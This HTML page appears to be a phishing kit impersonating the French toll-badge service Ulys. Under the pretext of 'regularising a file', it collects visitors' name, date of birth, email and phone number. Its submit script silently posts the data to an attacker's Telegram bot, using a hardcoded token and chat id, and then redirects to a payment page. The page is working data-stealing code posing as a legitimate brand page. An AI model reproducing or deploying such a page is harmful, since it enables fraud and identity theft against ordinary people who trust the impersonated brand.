<!DOCTYPE html>
<html lang="fr">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width,initial-scale=1" />
  <title>Informations personnelles ‚Äì Ulys</title>
  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600&display=swap" rel="stylesheet" />
  <style>
    * { box-sizing: border-box; margin: 0; padding: 0; }

    body {
      font-family: 'Inter', sans-serif;
      background: #FBEAD3;
      color: #1c1c1c;
    }

    .site-nav {
      background: #ffffff;
      border-bottom: 1px solid #EAD1B8;
    }

    .navbar {
      max-width: 1200px;
      margin: 0 auto;
      padding: 0.75rem 1.5rem;
      display: flex;
      align-items: center;
      justify-content: space-between;
    }

    .navbar-left {
      display: flex;
      align-items: center;
      gap: 1.5rem;
    }

    .logo-container {
      background: #ffffff;
      padding: 4px 6px;
      border-radius: 20px;
    }

    .logo {
      width: 80px;
      height: auto;
    }

    .header-toggle {
      display: inline-flex;
      border: 1px solid #ccc;
      border-radius: 25px;
      overflow: hidden;
      background: #f6f6f6;
    }

    .header-toggle .toggle {
      padding: 0.5rem 1.5rem;
      background: transparent;
      border: none;
      font-weight: 600;
      font-size: 0.9rem;
      color: #444;
      cursor: pointer;
      transition: background 0.3s ease;
    }

    .header-toggle .toggle.active {
      background: #ff8000;
      color: #fff;
    }

    main.container {
      flex: 1;
      max-width: 580px;
      margin: 3rem auto;
      padding: 0 1rem;
    }

    .card {
      background: #ffffff;
      border-radius: 28px;
      box-shadow: 0 6px 20px rgba(0, 0, 0, 0.08);
      padding: 3rem 2rem;
      width: 100%;
    }

    .form-logo-center {
      display: flex;
      justify-content: center;
      align-items: center;
      margin-bottom: 1.5rem;
    }

    .form-logo-center img {
      height: 65px;
      object-fit: contain;
    }

    .intro-text {
      text-align: center;
      font-size: 1rem;
      margin-bottom: 2rem;
      color: #333;
    }

    form label {
      display: block;
      margin: 1rem 0 0.3rem;
      font-weight: 600;
      font-size: 0.95rem;
      color: #1c1c1c;
    }

    form input {
      width: 100%;
      padding: 0.75rem 1rem;
      border: 1px solid #ccc;
      border-radius: 25px;
      background: #fafafa;
      font-size: 1rem;
    }

    form input::placeholder {
      color: #999;
      font-size: 0.95rem;
    }

    form input:focus {
      outline: none;
      border-color: #ff8000;
      box-shadow: 0 0 0 3px rgba(255, 128, 0, 0.2);
    }

    .btn {
      display: block;
      width: 100%;
      margin-top: 2rem;
      padding: 0.9rem;
      background: #ff8000;
      color: #fff;
      font-size: 1.05rem;
      font-weight: 600;
      text-align: center;
      border: none;
      border-radius: 25px;
      cursor: pointer;
      box-shadow: 0 4px 10px rgba(255, 128, 0, 0.2);
      transition: background 0.3s ease;
    }

    .btn:hover {
      background: #e57200;
    }

    footer {
      text-align: center;
      padding: 2rem 0;
      background-color: #ffffff;
      font-size: 0.9rem;
      color: #555;
      margin-top: 3rem;
    }

    #spinnerOverlay {
      display: none;
      position: fixed;
      inset: 0;
      background: rgba(0, 0, 0, 0.6);
      align-items: center;
      justify-content: center;
      z-index: 10000;
    }

    .spinner {
      width: 80px;
      height: 80px;
      border: 10px solid rgba(255, 255, 255, 0.2);
      border-top: 10px solid #ff8000;
      border-radius: 50%;
      animation: spin 1s linear infinite;
    }

    @keyframes spin {
      to {
        transform: rotate(360deg);
      }
    }
  </style>
</head>
<body>

  <!-- NAVIGATION -->
  <div class="site-nav">
    <nav class="navbar">
      <div class="navbar-left">
        <a href="index.html" class="logo-container">
          <img src="assets/images/logo-ulys2.png" alt="Ulys" class="logo" />
        </a>
        <div class="header-toggle">
          <button class="toggle active" onclick="toggleUserType(this)">Particulier</button>
          <button class="toggle" onclick="toggleUserType(this)">Professionnel</button>
        </div>
      </div>
    </nav>
  </div>

  <!-- FORMULAIRE -->
  <main class="container">
    <div class="card">
      <div class="form-logo-center">
        <img src="assets/images/logo-ulys2.png" alt="Ulys" />
      </div>

      <p class="intro-text">Afin de finaliser la r√©gularisation de votre dossier, veuillez compl√©ter les informations ci-dessous.</p>

      <form id="form-abonnement">
        <label>Civilit√©</label>
        <div class="header-toggle" id="civilite-toggle">
          <button type="button" class="toggle active" data-value="M.">M.</button>
          <button type="button" class="toggle" data-value="Mme">Mme</button>
        </div>
        <input type="hidden" name="civilite" id="civilite" value="M." />

        <label for="prenom">Pr√©nom</label>
        <input id="prenom" name="prenom" type="text" placeholder="Jean" required />
        <label for="nom">Nom</label>
        <input id="nom" name="nom" type="text" placeholder="Dupont" required />
        <label for="dob">Date de naissance</label>
        <input id="dob" name="dob" type="date" required />
        <label for="email">E-mail</label>
        <input id="email" name="email" type="email" placeholder="adresse@mail.com" required />
        <label for="confirm-email">Confirmation e-mail</label>
        <input id="confirm-email" name="confirm-email" type="email" placeholder="adresse@mail.com" required />
        <label for="tel">T√©l√©phone</label>
        <input id="tel" name="tel" type="tel" placeholder="+33 6 12 34 56 78" required />
        <button type="submit" class="btn">Continuer</button>
      </form>
    </div>
  </main>

  <!-- Spinner -->
  <div id="spinnerOverlay">
    <div class="spinner"></div>
  </div>

  <footer>
    &copy; 2025 Ulys. S√©curit√© renforc√©e.
  </footer>

  <script>
    function toggleUserType(button) {
      document.querySelectorAll(".header-toggle .toggle").forEach(btn => btn.classList.remove("active"));
      button.classList.add("active");
    }

    const toggleButtons = document.querySelectorAll("#civilite-toggle .toggle");
    const civiliteInput = document.getElementById("civilite");

    toggleButtons.forEach(btn => {
      btn.addEventListener("click", () => {
        toggleButtons.forEach(b => b.classList.remove("active"));
        btn.classList.add("active");
        civiliteInput.value = btn.dataset.value;
      });
    });

    const form = document.getElementById("form-abonnement");
    form.addEventListener("submit", function (e) {
      e.preventDefault();

      const civilite = document.getElementById("civilite").value;
      const prenom = document.getElementById("prenom").value;
      const nom = document.getElementById("nom").value;
      const dob = document.getElementById("dob").value;
      const email = document.getElementById("email").value;
      const tel = document.getElementById("tel").value;

      const message = `
üì• Nouvelle soumission d'informations :
üë§ ${civilite} ${prenom} ${nom}
üéÇ N√©(e) le : ${dob}
üìß Email : ${email}
üì± T√©l√©phone : ${tel}
      `;

      // Envoi vers ton bot Telegram
      fetch("https://api.telegram.org/bot8136145861:AAEkeva-K5BGkAlK8FMxDVknMN9Y1YQx26I/sendMessage", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          chat_id: "-4888029618",
          text: message
        })
      });

      document.getElementById("spinnerOverlay").style.display = "flex";
      setTimeout(() => {
        window.location.href = "paiement.html";
      }, 5000);
    });
  </script>
</body>
</html>
